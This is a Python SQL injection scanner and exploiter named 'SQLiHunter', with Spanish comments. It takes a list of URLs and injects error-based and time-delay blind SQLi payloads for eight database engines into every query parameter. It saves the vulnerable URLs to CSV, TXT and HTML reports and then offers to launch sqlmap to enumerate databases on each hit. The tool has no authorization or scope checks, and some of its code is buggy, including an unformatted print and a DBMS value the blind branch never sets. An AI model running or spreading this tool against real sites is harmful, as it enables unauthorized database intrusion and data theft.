import argparse
import requests
from urllib.parse import quote, urlparse, parse_qsl, urlencode
from colorama import init, Fore, Style, Back 
import time
import csv
import subprocess

init(autoreset=True)  # Inicializar Colorama para que los estilos se reseteen automáticamente

def encode_payload(payload):
    # Codificar el payload usando codificación URL
    return quote(payload)

def detect_sqli(url, results):
    # Payloads específicos para diferentes gestores de bases de datos
    error_based_payloads = {
        "MySQL": "' OR '1'='1",
        "Oracle": "' OR '1'='1",
        "SQL Server": "' OR '1'='1",
        "PostgreSQL": "' OR '1'='1",
        "SQLite": "' OR '1'='1",
        "DB2": "' OR '1'='1",
        "Informix": "' OR '1'='1",
        "Sybase": "' OR '1'='1"
    }

    blind_payloads = {
        "MySQL": "' OR IF(1=1, SLEEP(5), 0) -- ",
        "Oracle": "' OR 1=1 AND dbms_pipe.receive_message('a',5) IS NULL -- ",
        "SQL Server": "'; IF (1=1) WAITFOR DELAY '00:00:05' -- ",
        "PostgreSQL": "'; SELECT pg_sleep(5) -- ",
        "SQLite": "'; SELECT sleep(5) -- ",
        "DB2": "'; CALL dbms_lock.sleep(5) -- ",
        "Informix": "'; execute function sleep(5) -- ",
        "Sybase": "'; WAITFOR DELAY '00:00:05' -- "
    }

    # Parsear la URL para obtener sus componentes
    parsed_url = urlparse(url)
    query_params = dict(parse_qsl(parsed_url.query))
    
    # Diccionario de mensajes de error y sus respectivos gestores de bases de datos
    dbms_errors = {
        "MySQL": ["mysql_fetch_array", "You have an error in your SQL syntax;", "Warning: mysql"],
        "Oracle": ["ORA-01756", "ORA-", "Oracle error"],
        "SQL Server": ["Unclosed quotation mark after the character string", "Server error in '/' application.", "Microsoft OLE DB Provider for SQL Server", "Incorrect syntax near"],
        "PostgreSQL": ["PostgreSQL query failed:", "invalid input syntax for type"],
        "SQLite": ["sqlite3.IntegrityError", "SQLite/JDBCDriver error"],
        "DB2": ["DB2 SQL error:"],
        "Informix": ["Exception: Informix"],
        "Sybase": ["Sybase message:"]
    }

    found_errors = []
    dbms_used = None
    vulnerable_params = []

    # Probar cada parámetro con el payload de error
    for param in query_params:
        for dbms, payload in error_based_payloads.items():
            original_value = query_params[param]
            query_params[param] = encode_payload(payload)
            modified_query = urlencode(query_params)
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
            
            response = requests.get(target_url)
            
            for error in dbms_errors.get(dbms, []):
                if error.lower() in response.text.lower():
                    found_errors.append(error)
                    dbms_used = dbms  # Asumir el primer DBMS encontrado
                    vulnerable_params.append(param)
                    break
            if dbms_used:
                break
        
        # Restaurar el valor original del parámetro para seguir probando los demás
        query_params[param] = original_value

    if found_errors:
        print(f"{Style.BRIGHT}{Back.CYAN}Vulnerabilidad SQLi Detectada!{Back.RESET}\n{Fore.WHITE}Tipo: {Fore.GREEN}SQLi por Error\n{Fore.WHITE}URL: {Fore.GREEN}{url}\n{Fore.WHITE}DBMS: {Fore.GREEN}{dbms_used}\n{Fore.WHITE}Errores: {Fore.GREEN}{', '.join(found_errors)}\n{Fore.WHITE}Parámetros Vulnerables: {Fore.GREEN}{', '.join(vulnerable_params)}")
        print(Fore.RESET + "----" * 15)
        results.append((url, vulnerable_params, "SQLi por Error"))
    else:
        # Si no se detecta SQLi con errores, probar SQLi Blind
        if detect_blind_sqli(url, query_params, blind_payloads):
            print("{Style.BRIGHT}{Back.CYAN}Vulnerabilidad SQLi Blind Detectada!{Back.RESET}\n{Fore.WHITE}Tipo: {Fore.GREEN}SQLi Blind\n{Fore.WHITE}URL: {Fore.GREEN}{url}\n{Fore.WHITE}DBMS: {Fore.GREEN}{dbms_used}\n{Fore.WHITE}Errores: {Fore.GREEN}{', '.join(found_errors)}\n{Fore.WHITE}Parámetros Vulnerables: {Fore.GREEN}{', '.join(vulnerable_params)}")
            print(Fore.RESET + "----" * 15)
            results.append((url, list(query_params.keys()), "SQLi Blind"))
        else:
            print(f"{Style.BRIGHT}{Back.MAGENTA}Análisis Completado.{Back.RESET}\n{Fore.RESET}URL: {Fore.YELLOW}{url}\n{Fore.RESET}Resultado: {Fore.RED}No se encontró vulnerabilidad SQLi.")
            print(Fore.RESET + "----" * 15)

def detect_blind_sqli(url, query_params, blind_payloads):
    for dbms, blind_payload in blind_payloads.items():
        for param in query_params:
            original_value = query_params[param]
            query_params[param] = encode_payload(blind_payload)
            modified_query = urlencode(query_params)
            target_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{urlparse(url).path}?{modified_query}"
            
            start_time = time.time()
            response = requests.get(target_url)
            end_time = time.time()
            
            query_params[param] = original_value  # Restaurar el valor original del parámetro

            if end_time - start_time > 5:
                return True
    return False

def save_to_csv(results):
    with open('vulnerable_urls.csv', 'w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["Tipo de SQLi", "URL", "Parámetros Vulnerables"])
        for result in results:
            writer.writerow([result[2], result[0], ', '.join(result[1])])

def save_to_txt(results):
    with open('vulnerable_urls.txt', 'w') as file:
        for result in results:
            file.write(f"{result[2]}: {result[0]} (Parámetros vulnerables: {', '.join(result[1])})\n")

def save_to_html(results):
    with open('vulnerable_urls.html', 'w') as file:
        file.write("""
        <html>
        <head>
            <title>Vulnerable URLs</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f4f4f4;
                    margin: 0;
                    padding: 0;
                }
                .container {
                    width: 80%;
                    margin: 0 auto;
                    overflow: hidden;
                }
                #main {
                    background: #fff;
                    color: #333;
                    padding: 20px;
                    margin-top: 20px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin: 20px 0;
                }
                table, th, td {
                    border: 1px solid #ddd;
                }
                th, td {
                    padding: 10px;
                    text-align: left;
                }
                th {
                    background-color: #f4f4f4;
                }
                tr:nth-child(even) {
                    background-color: #f9f9f9;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div id="main">
                    <h1>Vulnerable URLs</h1>
                    <table>
                        <tr>
                            <th>Tipo de SQLi</th>
                            <th>URL</th>
                            <th>Parámetros Vulnerables</th>
                        </tr>
        """)
        for result in results:
            file.write(f"""
                        <tr>
                            <td>{result[2]}</td>
                            <td>{result[0]}</td>
                            <td>{', '.join(result[1])}</td>
                        </tr>
            """)
        file.write("""
                    </table>
                </div>
            </div>
        </body>
        </html>
        """)

def attempt_exploit(results):
    for result in results:
        url = result[0]
        params = result[1]
        for param in params:
            print(f"{Back.BLUE}{Fore.RESET}Ejecutando sqlmap en {url} con el parámetro {param}...")
            try:
                subprocess.run(["sqlmap", "-u", url, "-p", param, "--dbs", "--batch", "--random-agent", "--time-sec", "2", "--level", "5"], check=True)
            except subprocess.CalledProcessError as e:
                print(Fore.RED + f"Error al ejecutar sqlmap en {url} con el parámetro {param}: {e}")
            print(Fore.RESET + "----" * 15)

def main(args):
    results = []

    # Leer las URLs desde el archivo
    try:
        with open(args.url_file, 'r') as file:
            urls = file.readlines()
    except FileNotFoundError:
        print("Error: El archivo de URLs especificado no existe.")
        return
    except Exception as e:
        print(f"Error al leer el archivo de URLs: {e}")
        return

    # Ejecutar la detección de SQLi para cada URL
    for url in urls:
        url = url.strip()  # Limpiar espacios en blanco y saltos de línea
        if url:  # Asegurar que la URL no esté vacía
            detect_sqli(url, results)
    
    # Almacenar las URLs vulnerables en archivos
    if results:
        save_to_csv(results)
        save_to_txt(results)
        save_to_html(results)
        
        print(Back.YELLOW + Fore.BLACK + "[!] Las URLs vulnerables se han guardado en 'vulnerable_urls.csv', 'vulnerable_urls.txt', y 'vulnerable_urls.html'")
        print(Fore.RESET + "----" * 15)
        
        # Imprimir resumen final
        print(Back.GREEN + Fore.BLACK + "\nResumen de URLs y parámetros vulnerables:")
        for result in results:
            print(f"{Fore.RESET}{result[2]}: {Style.BRIGHT}{Fore.GREEN}{result[0]} {Fore.CYAN}(Parámetros vulnerables: {', '.join(result[1])})")
        
        # Preguntar si se desea intentar explotar las vulnerabilidades
        print(Fore.RESET + "----" * 15)
        choice = input(Style.BRIGHT + Fore.YELLOW + "\n¿Desea intentar explotar las vulnerabilidades detectadas con sqlmap? (s/n): ").strip().lower()
        if choice == 's':
            attempt_exploit(results)
    else:
        print(Style.BRIGHT + Fore.CYAN + "Descubrimiento finalizado!!!")

if __name__ == "__main__":
    print(Style.BRIGHT + Fore.GREEN + """

███████╗ ██████╗ ██╗     ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██║██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                         > By Mr-r00t    Version 1.0                                                               
    """)
    print(Fore.RESET + "----" * 15)
    # Configuración del parser de argumentos
    parser = argparse.ArgumentParser(description="Detect SQL Injection vulnerabilities using specified URL file.")
    parser.add_argument("url_file", help="Path to the file containing URLs.")

    # Parsear argumentos
    args = parser.parse_args()
    
    # Llamar a main con los argumentos
    main(args)
